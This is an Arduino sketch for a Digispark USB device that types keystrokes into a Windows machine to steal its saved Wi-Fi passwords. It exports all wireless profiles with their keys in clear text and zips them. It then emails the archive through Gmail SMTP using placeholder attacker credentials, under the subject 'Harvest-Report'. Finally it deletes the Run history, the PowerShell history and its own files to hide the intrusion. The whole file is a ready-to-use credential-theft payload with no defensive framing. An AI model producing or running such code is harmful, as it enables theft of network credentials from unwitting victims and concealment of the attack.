#include "DigiKeyboard.h"

void setup() {}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT,KEY_D);
  DigiKeyboard.delay(150);
  DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT,KEY_R);
  DigiKeyboard.delay(400);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("color FE & mode con:cols=18 lines=1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("cd Desktop");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("mkdir A");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("cd A");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("netsh wlan export profile key=clear ");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("cd ..");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("Compress-Archive -Path A -DestinationPath A.zip");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  DigiKeyboard.delay(500);
  DigiKeyboard.print("$SMTPServer = 'smtp.gmail.com'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("$SMTPInfo.EnableSsl = $true");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('My-EMAIL', 'My-PASSWORD')");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("$ReportEmail = New-Object System.Net.Mail.MailMessage");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("$ReportEmail.From = 'My-EMAIL'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("$ReportEmail.To.Add('My-RECEIVER-EMAIL')");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("$ReportEmail.Subject = \"Harvest-Report\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("$ReportEmail.Body = \"GG, you got it\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("$ReportEmail.Attachments.Add(\"A.zip\")");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("$SMTPInfo.Send($ReportEmail)");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(400);
  // --> Clean up
  DigiKeyboard.print("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("cd ..");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("cd AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("del ConsoleHost_history.txt");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("del A & rmdir A");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("S");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("del A.zip & exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
